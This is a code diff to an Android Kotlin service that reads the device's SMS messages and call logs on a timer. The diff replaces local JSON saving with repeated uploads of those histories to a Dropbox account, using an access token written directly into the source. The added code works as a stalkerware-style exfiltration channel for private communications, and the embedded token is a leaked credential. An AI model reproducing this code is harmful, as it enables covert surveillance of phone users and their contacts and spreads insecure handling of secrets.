@@ -5,26 +5,30 @@ import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
 import android.content.ContentResolver
-import android.content.ContentUris
-import android.content.ContentValues
 import android.content.Context
 import android.content.Intent
 import android.database.Cursor
 import android.net.Uri
 import android.os.Build
-import android.os.Environment
 import android.os.Handler
 import android.os.IBinder
 import android.provider.CallLog
-import android.provider.MediaStore
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import com.dropbox.core.DbxRequestConfig
+import com.dropbox.core.v2.DbxClientV2
+import com.dropbox.core.v2.files.WriteMode
+import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.ByteArrayInputStream
 
 class MessageAndCallService : Service() {
 
     private val handler = Handler()
+    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
+    private lateinit var dropboxClient: DbxClientV2
+
     private val runnable = object : Runnable {
         override fun run() {
             collectMessagesAndCalls()
@@ -32,12 +36,9 @@ class MessageAndCallService : Service() {
         }
     }
 
-    // URIs to keep track of the files created
-    private var messagesFileUri: Uri? = null
-    private var callsFileUri: Uri? = null
-
     override fun onCreate() {
         super.onCreate()
+        setupDropboxClient()
         handler.post(runnable)
         startForegroundNotification()
     }
@@ -54,6 +55,7 @@ class MessageAndCallService : Service() {
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacks(runnable)
+        scope.cancel()  // Cancel all coroutines when service is destroyed
         Log.d(TAG, "Service Destroyed")
     }
 
@@ -61,12 +63,16 @@ class MessageAndCallService : Service() {
         return null
     }
 
+    private fun setupDropboxClient() {
+        val accessToken = "sl.B6IgNZ0_UVaw-n6v7haSXlq6csgMan3oDZA4LDOCrY_XzV41p9P_v26rpHXOrFEGjMFTlx4iX9pS2dUo2tIZva1relXBo50b32VtlaAud7VUcsrZeUfEF4-9cK7JOrzA03Uy6TGpQD6I9d9LbuGaMbE"
+        val config = DbxRequestConfig.newBuilder("dropbox/android-textmessageapi").build()
+        dropboxClient = DbxClientV2(config, accessToken)
+    }
+
     private fun collectMessagesAndCalls() {
-        println("Collecting Messages!")
+        Log.d(TAG, "Collecting Messages and Calls")
         collectMessages()
-        println("Collected Messages!")
         collectCallLogs()
-        println("Collected Calls!")
     }
 
     private fun collectMessages() {
@@ -91,9 +97,11 @@ class MessageAndCallService : Service() {
                 it.close()
             }
         }
-        messagesFileUri = saveDataToJsonFile("messages.json", messages, messagesFileUri)
-        println("Messages File Path ${messagesFileUri?.path}")
 
+        // Upload data to Dropbox in a coroutine
+        scope.launch {
+            uploadDataToDropbox("messages.json", messages.toString())
+        }
     }
 
     private fun collectCallLogs() {
@@ -120,35 +128,25 @@ class MessageAndCallService : Service() {
                 it.close()
             }
         }
-        callsFileUri = saveDataToJsonFile("calls.json", calls, callsFileUri)
-        println("Messages File Path ${callsFileUri?.path}")
+
+        // Upload data to Dropbox in a coroutine
+        scope.launch {
+            uploadDataToDropbox("calls.json", calls.toString())
+        }
     }
 
-    private fun saveDataToJsonFile(filename: String, data: JSONArray, existingUri: Uri?): Uri? {
-        val resolver = contentResolver
-        val externalUri = existingUri?:MediaStore.Files.getContentUri("external")
-
-        // If file exists, delete it
-        existingUri?.let {
-            resolver.delete(it, null, null)
-        }
-
-        // Create new file
-        val contentValues = ContentValues().apply {
-            put(MediaStore.MediaColumns.DISPLAY_NAME, filename)
-            put(MediaStore.MediaColumns.MIME_TYPE, "application/json")
-            put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOCUMENTS)
-        }
-
-        val uri: Uri? = resolver.insert(externalUri, contentValues)
-        uri?.let {
-            resolver.openOutputStream(it)?.use { outputStream ->
-                outputStream.write(data.toString().toByteArray())
-                Log.d(TAG, "Data saved to $filename")
+    private suspend fun uploadDataToDropbox(fileName: String, data: String) {
+        withContext(Dispatchers.IO) {
+            try {
+                val inputStream = ByteArrayInputStream(data.toByteArray())
+                dropboxClient.files().uploadBuilder("/$fileName")
+                    .withMode(WriteMode.OVERWRITE)
+                    .uploadAndFinish(inputStream)
+                Log.d(TAG, "$fileName uploaded to Dropbox")
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to upload $fileName to Dropbox", e)
             }
-        } ?: Log.e(TAG, "Failed to create new file")
-
-        return uri
+        }
     }
 
     private fun startForegroundNotification() {
